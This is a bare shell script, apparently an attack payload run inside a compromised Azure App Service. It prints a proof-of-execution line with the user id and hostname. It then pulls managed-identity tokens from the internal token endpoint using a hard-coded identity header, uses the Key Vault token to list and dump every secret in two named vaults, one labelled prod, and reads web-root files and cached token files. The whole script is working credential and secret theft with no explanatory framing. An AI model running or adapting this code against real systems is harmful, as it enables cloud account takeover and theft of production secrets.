printf 'PROOF '; id|tr -d '\n'; printf ' host='; hostname; printf '\n'
IH=40dcfecb-3b2f-7086-721d-670bc5dafdf8
for IP in 169.254.131.2 169.254.131.5; do
 for RES in https://vault.azure.net https://management.azure.com; do
  U="http://$IP:8081/msi/token?resource=$RES&api-version=2019-08-01"
  T=$(curl -s -m 15 -H "X-IDENTITY-HEADER: $IH" "$U")
  printf 'MI %s %s: %s\n' "$IP" "$RES" "$(printf '%s' "$T"|head -c 160)"
  tok=$(printf '%s' "$T"|sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
  if [ -n "$tok" ] && [ "$RES" = "https://vault.azure.net" ]; then
    for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
      L=$(curl -s -H "Authorization: Bearer $tok" "https://$V.vault.azure.net/secrets?api-version=7.4")
      printf 'KVLIST %s: %s\n' "$V" "$L"
      for id in $(printf '%s' "$L"|grep -oE '"id":"[^"]+"'|sed -e 's/.*"id":"//' -e 's/"//'); do
        printf 'SECRET %s/%s: %s\n' "$V" "$id" "$(curl -s -H "Authorization: Bearer $tok" "$id?api-version=7.4")"
      done
    done
  fi
 done
done
printf 'WS: '; ls -la /home/site/wwwroot 2>/dev/null | head -20
printf 'MITOKS: '; cat /home/site/wwwroot/mitok_*.txt 2>/dev/null | head -c 300
printf '\nINNER_DONE\n'
